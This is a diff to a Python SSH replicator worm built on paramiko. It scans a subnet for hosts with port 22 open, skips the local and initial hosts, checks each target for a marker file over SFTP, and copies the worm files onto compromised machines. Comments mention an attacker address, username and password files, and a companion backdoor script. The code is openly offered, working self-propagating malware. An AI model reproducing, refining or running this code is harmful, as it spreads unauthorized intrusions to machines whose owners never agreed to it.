@@ -1,3 +1,4 @@
+#192.168.1.4
 """ Used to create a basic SSH replicator worm. Nothing fancy and probably
     terrible python, but it works. """
 
@@ -9,6 +10,14 @@ import paramiko
 def get_local_ip():
     """ Gets current machine's ip """
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # ### Reference
+    # current_script = sys.argv[0] 
+    # local_attacker = sys.argv[1]
+    # marker_file = sys.argv[2]    ## hardcoded as "info.txt" in local_backdoor.py
+    # username_file = sys.argv[3] 
+    # password_file = sys.argv[4]
+    # ############################ #
+
     sock.connect(('8.8.8.8', 1))
     local_ip = sock.getsockname()[0]
     sock.close()
@@ -84,12 +93,16 @@ class SSHConnection:
     def retrieve_vulnerable_hosts(self, start_ip, max_ip):
         """ Retrieve list of hosts to attack, removes local computer """
         print ("[+] Getting vulnerable hosts")
+        with open("SSHConnection.py", "r") as remove_initial:
+            initial_ip = remove_initial.readline()[1:-1].strip()
         port = 22
         hosts = [start_ip + str(i) for i in range(0, max_ip)]
         live_hosts = []
         local_host = get_local_ip()
         for host in hosts:
             if host == local_host:
+                continue
+            if host == initial_ip:
                 continue
             try:
                 ssh_sock = socket.socket()
@@ -152,8 +165,6 @@ class SSHConnection:
                 if self.check_if_marked():
                     print ("[+] Infecting %s" % (host))
                     return host
-                else:
-                    print ("[!] %s marker file found" % (host))
             else:
                 self.ssh_connection.close()
         # No host found
@@ -162,14 +173,16 @@ class SSHConnection:
 
     def check_if_marked(self):
         """ Checks to see if the current target has the worm on it. """
-        stdin, stdout, stderr = self.ssh_connection.exec_command("ls " + self.target_dir)
-        results = stdout.readlines()
-        results = [str(name) for name in results]
-        results = [name[0:-1] for name in results]
+        sftp = self.ssh_connection.open_sftp()
+        #stdin, stdout, stderr = self.ssh_connection.exec_command("ls " + self.target_dir, timeout=10)
+        #results = stdout.readlines()
+        results = sftp.listdir()
+        #results = [str(name) for name in results]
+        #results = [name[0:-1] for name in results]
         return self.worm_file not in results
 
     def place_worm(self):
-        """ Places the worm and related files on the remote system. """
+        """ Places the worm on the remote system. """
         sftp_client = self.ssh_connection.open_sftp()
         for file_name in self.files:
             host_side = self.host_dir + file_name
